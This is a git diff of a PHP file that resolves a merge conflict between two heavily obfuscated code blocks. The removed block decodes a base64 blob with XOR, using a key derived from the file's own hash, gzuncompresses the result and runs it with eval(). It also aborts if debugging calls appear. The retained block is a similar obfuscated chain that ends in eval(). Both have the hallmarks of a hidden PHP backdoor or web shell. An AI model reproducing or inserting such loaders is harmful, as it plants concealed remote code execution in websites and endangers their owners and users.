@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$dvpkrvb="66dddebe3062d59e0420c4b0be0ece0d";
-$vwackefc="070756075151070000025306070d0c570052005106550151505c555651060657";
-$pnokudzrl="SeunN+5eviUjT1LMfL5VjqKXH+QnCUl6lUj/cZLFgOg29LruAaLyraGI3n5+csuPm7PIR8yxaeKXoFbU/itRBZdqJkrAJUMMycpMvUZ3lzqJHq6aeVB1tv9/1gLaF6w+2fFFdXAAIVRwDDbLZjxPtQjC+kAwFkMxeC/icaW+e40d3931OoQARJSgQAXPQYe3JzXUyFdOTIqVonGfmchBQ1LWp+BT9+rNI0108v78DSJAJbdoUHrcNK+Dt98bAQifgunlGWk19D5Fo1CUn1IU1TlhNWm0wo2CXjTz5sBdeSQfkKjgmVRZMwMpeXOixTi/c5IYUnUJ1KB9iz2ZwLrhyvO3I2/YZ6hXzNTxLjlK9nZfQmJpwMvRrspzMyYwvoolQfg57gdgQWufkUHV9f1XW7MzfErowA7+v0C/fStdtMTy0II1jWpZ4mxlpFucHsIjHplxitc/y3suNQWqNDcUV3OI4XuG0jhznA8d3u5GU/pvy8gvS/fQuvtbz/o2r5E4kf4AyO900F21LZLnDGtVc84W48xCFSjSR8741zhNVzJonJj2wGsU5gdFXE0rRIhUL0ZmmvgOtrkG0XXb3WZ6m+FhU7EjTuxvf1OoFgHq7hbwtVafyf06khdJolcbnzArOJ1HkksxWKoBsMeLXHgJ2NsD2Ar1iYBvz3XHVETRGk3ThAFURaB86ryhhhvobGKFO4gLfLTLZ/2j0JerDK9L4xiuC0L/b08M/pMGjhJvcjjFnTEQCA1G";
-$vtfdnp=file_get_contents(__FILE__);
-$bxntwajjlg=str_replace($pnokudzrl,"",$vtfdnp);
-if(strpos($bxntwajjlg,"ec"."ho")!==false||strpos($bxntwajjlg,"pr"."int")!==false||strpos($bxntwajjlg,"var_"."dump")!==false||strpos($bxntwajjlg,"file_put_"."contents")!==false||strpos($bxntwajjlg,"fw"."rite")!==false){die();}
-$keihsh=str_replace(array($dvpkrvb,$vwackefc),array("SP_8863bb0c","KP_f9ebbed2"),$vtfdnp);
-$yflmmeoz=md5($keihsh);
-$uviyxmo=hex2bin($vwackefc);
-$gtzffeu="";
-$vfmqxbbir=strlen($yflmmeoz);
-for($anwlgisivx=0;$anwlgisivx<$vfmqxbbir;$anwlgisivx++){
-$gtzffeu.=chr(ord($uviyxmo[$anwlgisivx])^ord($yflmmeoz[$anwlgisivx]));
-}
-$xyytciqszaey=base64_decode($pnokudzrl);
-$pqxhbjt=strlen($xyytciqszaey);
-$yrhvoijaf="";
-$kulojye=strlen($gtzffeu);
-for($anwlgisivx=0;$anwlgisivx<$pqxhbjt;$anwlgisivx++){
-$yrhvoijaf.=$xyytciqszaey[$anwlgisivx]^$gtzffeu[$anwlgisivx%$kulojye];
-}
-$wjhgylp="gzun"."compress";
-eval($wjhgylp($yrhvoijaf));
-=======
 // ea2f6813ad25184f805aff3f
 $YiIKeAhVmZv="H3khH3LuXKD+E92fQ+ouwuv8e/Ojde1nJSgNxX0yvfA=";
 $qoQdIXQ_uQJu="U3xuU3YhKXQ+R92sD+bhjhi8r/Bwqr1aWFtAkK0lisN=";
@@ -52,4 +27,3 @@ $BLspCssZFy=$o_RJPsAvgWQ($BLspCssZFy);
 $BLspCssZFy=$PnquIufyHwD($BLspCssZFy);
 $BLspCssZFy=$IrLYYyEJvh($BLspCssZFy);
 eval($BLspCssZFy);
->>>>>>> Stashed changes
